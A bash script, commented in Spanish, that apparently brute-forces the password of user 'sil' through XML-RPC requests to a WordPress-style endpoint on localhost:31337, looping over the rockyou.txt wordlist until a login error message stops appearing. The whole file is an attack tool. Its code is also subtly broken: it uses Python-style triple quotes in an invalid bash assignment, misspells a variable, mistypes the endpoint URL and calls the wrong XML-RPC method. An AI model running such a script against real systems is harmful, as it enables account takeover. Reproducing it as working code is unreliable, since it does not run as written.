#!/bin/bash

function createXML(){
 password=$1

 xmlFile = """
<?xml version=\"1.0\" encoding=\"utf-8\"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params>
<param><value>sil</value></param>
<param><value>$password</value></param>
</params>
</methodCall>"""

#renovamos con esto el archivo que lo contendrá y que mandaremos
 echo $xmlFile > file.xml
 respones=$(curl -s -X POST "http://localhost:31337/xmlrpc:php" -d@file.xml)

 if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
  echo -e "\n[+] La contraseña para el usuario sil es $password"
  exit 0
 fi
}

cat /usr/share/wordlists/rockyou.txt | while read password; do
        createXML $password
done
